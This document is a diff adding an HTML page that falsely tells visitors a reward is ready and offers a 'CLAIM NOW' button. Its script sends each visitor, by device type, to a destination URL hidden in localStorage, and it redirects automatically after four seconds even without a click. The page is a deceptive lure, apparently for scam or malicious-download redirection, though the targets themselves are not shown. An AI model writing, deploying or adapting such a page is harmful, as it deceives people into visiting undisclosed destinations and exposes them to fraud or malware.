@@ -1,0 +1,27 @@
+<html>
+<body style="text-align:center;font-family:Arial">
+
+<h2>Congratulations 🎉</h2>
+<p>Your reward is ready!</p>
+
+<button onclick="go()" style="padding:15px;font-size:18px;background:green;color:white;border:none">
+CLAIM NOW
+</button>
+
+<script>
+function go(){
+let ua=navigator.userAgent;
+let a=localStorage.getItem("android");
+let i=localStorage.getItem("ios");
+let d=localStorage.getItem("desktop");
+
+if(/android/i.test(ua))location=a;
+else if(/iphone|ipad/i.test(ua))location=i;
+else location=d;
+}
+
+setTimeout(go,4000);
+</script>
+
+</body>
+</html>
